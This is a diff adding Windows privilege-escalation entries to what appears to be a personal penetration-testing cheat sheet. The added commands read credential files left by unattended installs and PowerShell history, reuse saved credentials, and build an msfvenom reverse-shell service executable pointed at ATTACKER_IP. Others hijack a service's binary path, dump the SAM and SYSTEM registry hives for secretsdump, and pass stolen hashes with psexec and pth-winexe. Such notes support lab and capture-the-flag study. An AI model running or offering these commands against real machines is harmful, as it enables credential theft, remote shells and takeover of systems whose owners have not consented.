@@ -21,6 +21,13 @@ smbget -R smb://IP_ADDRESS/SHARE
 #TCPDump
 sudo tcpdump port # -A
 
+#Windows
+sc qc - get info about a service. See unquoted service paths.
+sc stop/start - stop and start services.
+icacls - check permissions.
+icacls FILE /grant GROUP:PERMISSIONS
+whoami /priv
+
 
 
 Brute-Forcing
@@ -83,6 +90,43 @@ https://gtfobins.github.io
 sudo -l
 find / -user root -perm -4000 -exec ls -ldb {} \; > /tmp/ckprm 2>/dev/null
 #world-writable files: /tmp, /dev/shm,/var/lock, /run/lock
+
+#Windows
+#Priv2Admin
+https://github.com/gtworek/Priv2Admin
+
+Leftover credentials from unattended installations: 
+C:\Unattend.xml 
+C:\Windows\Panther\Unattend.xml 
+C:\Windows\Panther\Unattend\Unattend.xml 
+C:\Windows\system32\sysprep.inf 
+C:\Windows\system32\sysprep\sysprep.xml
+
+Retrieve password history from cmd.exe:
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+Powershell:
+type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+View saved credentials:
+cmdkey /list
+( to use creds )
+runas /savecred /user:admin cmd.exe
+
+Generate malicious exe:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
+Change path to malicious .exe on configurable service:
+sc config SERVICE_NAME binPath= "C:\PATH_TO_MALICIOUS_EXE" obj= ACCOUNT
+
+If SeBackup Privilege:
+reg save hklm\system OUTFILE.hive
+reg save hklm\sam OUTFILE.hive
+Copy to impacket-smbserver:
+impacket-smbserver -smb2support -username USER -password PASSWORD SHARENAME DIRECTORY 
+impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+
+Pass the hash:
+impacket-psexec -hashes HASH USER@IP_ADDRESS
+pth-winexe -U 'username%hash' //MACHINE_IP cmd.exe
 
 
 
